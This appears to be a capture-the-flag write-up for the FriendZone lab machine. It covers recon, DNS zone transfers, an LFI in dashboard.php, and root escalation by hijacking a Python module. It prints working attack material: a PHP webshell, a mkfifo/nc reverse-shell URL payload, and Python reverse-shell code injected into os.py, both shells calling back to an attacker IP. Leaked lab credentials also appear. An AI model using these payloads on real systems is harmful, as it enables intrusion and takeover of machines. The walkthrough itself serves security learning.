1,Recon
port scan
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Firstly, I would want to start with `SMB` service
```
mbclient -L //10.10.10.123    
Password for [WORKGROUP\wither]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
```
We can get a cred.txt file from `smbclient //10.10.10.123/general`
```
cat creds.txt           
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

In this place, I found there is DNS service, so I think there would be something useful from the domain
```
dig axfr friendzone.htb @10.10.10.123

; <<>> DiG 9.20.2-1-Debian <<>> axfr friendzone.htb @10.10.10.123
;; global options: +cmd
; Transfer failed.
```
That means `friendzone.htb` would not be the valid domain name
But I found `friendzone.red` from `ssl/http`
```
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
```
Then let's check it again
```
dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.20.2-1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 35 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Tue Dec 10 05:28:03 EST 2024
;; XFR size: 8 records (messages 1, bytes 289)

```

`administrator1.friendzone.red` 
`hr.friendzone.red`
`uploads.friendzone.red`
seems like a target here.

`## Email us at: info@friendzoneportal.red` from the index page, So I think `friendzoneportal.red` would also be the valid domain.

```
dig axfr friendzoneportal.red @10.10.10.123

; <<>> DiG 9.20.2-1-Debian <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 15 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Tue Dec 10 05:35:18 EST 2024
;; XFR size: 9 records (messages 1, bytes 309)
```

`admin.friendzoneportal.red`
`files.friendzoneportal.red`
`imports.friendzoneportal.red`
`vpn.friendzoneportal.red`
We can get these sub-domains

Page check
All of the `friendzone.red` sub-domains redirect to this page, so I would continue to enumerate its web-content.
![](images/Pasted%20image%2020241210051735.png)

But I can found a login page from `https://administrator1.friendzone.red/`
![](images/Pasted%20image%2020241210054130.png)
After login, we found 
![](images/Pasted%20image%2020241210054744.png)

So let's continue to check the `/dashboard.php`
![](images/Pasted%20image%2020241210054900.png)
In this place, We can try the default parameter, and check what is happening
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
![](images/Pasted%20image%2020241210055832.png)
we found in the bottom of page, the `timestamp.php` is showed.
```
curl -k https://administrator1.friendzone.red/timestamp.php
Final Access timestamp is 1733831975
```

So I guess there would be a LFI vulner.
I can use this LFI to read source code for these pages using php filters. If I visit pagename=php://filter/convert.base64-encode/resource=dashboard, I can see a long base64 string on the page:
![](images/Pasted%20image%2020241210060025.png)

And decode them, we can get the source code here.
```
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>

```

In this place, I can upload a webshell by the `Development` of SMB, and by use this LFI to exploit it.
```
root@kali# cat cmd.php 
<?php system($_REQUEST['cmd']); ?>

root@kali# smbclient -N //10.10.10.123/Development -c 'put cmd.php cmd.php'
putting file cmd.php as \0xdf.php (0.6 kb/s) (average 0.6 kb/s)
```

from 
```
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
```

So I guess `Development` would be also in the path `/etc/Development`
The payload would be 
`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../etc/Development/cmd&cmd=id`
![](images/Pasted%20image%2020241210061605.png)
here we go, we catch them.
If we want to get a reverse shell, the payload would be
```
https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/cmd&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.16.10 443 >/tmp/f (remembering to encode the & as %26
```

`https://admin.friendzoneportal.red/`
![](images/Pasted%20image%2020241210054239.png)
Then after login with the before cred from SMB, we get 
![](images/Pasted%20image%2020241210054719.png)

`https://uploads.friendzone.red/`
![](images/Pasted%20image%2020241210054302.png)

2, shell as valid user
It seems very easy, we can find a file `mysql_data.conf`
```
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
We just use this cred to su and get the shell as friend

3, shell as root
Firstly I would check `sudo -l`
```
sudo -l
[sudo] password for friend: Agpyu12!0.213$

Sorry, user friend may not run sudo on FriendZone.
```
After enumerating the file system, I found `reporter.py` from `/opt/server_admin`
I think this would be run by root
From `pspy64`, I found guess is true
```
2024/12/10 13:29:31 CMD: UID=0    PID=1      | /sbin/init splash 
2024/12/10 13:30:01 CMD: UID=0    PID=1451   | /usr/bin/python /opt/server_admin/reporter.py 
2024/12/10 13:30:01 CMD: UID=0    PID=1450   | /bin/sh -c /opt/server_admin/reporter.py 
2024/12/10 13:30:01 CMD: UID=0    PID=1449   | /usr/sbin/CRON -f
```

reporter.py (we can not write or change it)
```
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

I noticed that the python module, os, was writable:
```
friend@FriendZone:/usr/lib/python2.7$ find -type f -writable -ls
   262202     28 -rw-rw-r--   1 friend   friend      25583 Jan 15 22:19 ./os.pyc
   282643     28 -rwxrwxrwx   1 root     root        25910 Jan 15 22:19 ./os.py
```

I can use the following command to see the python path order:
```
friend@FriendZone:/dev/shm$ python -c 'import sys; print "\n".join(sys.path)'

/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
```

The most common case for this kind of hijack is finding the directory containing the python script writable. In that case, I could drop an os.py in next to reporter.py and it would load there before checking /usr/lib/python2.7/. In this case, I actually can’t write to /opt/server_admin/. But I can write directly to the normal version of this module.

Just use nano to change it and wait for the reverse shell come back.
```
...[snip]...
def _pickle_statvfs_result(sr):
    (type, args) = sr.__reduce__()
    return (_make_statvfs_result, args)

try:
    _copy_reg.pickle(statvfs_result, _pickle_statvfs_result,
                     _make_statvfs_result)
except NameError: # statvfs_result may not exist
    pass

import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

Then we can get the root shell
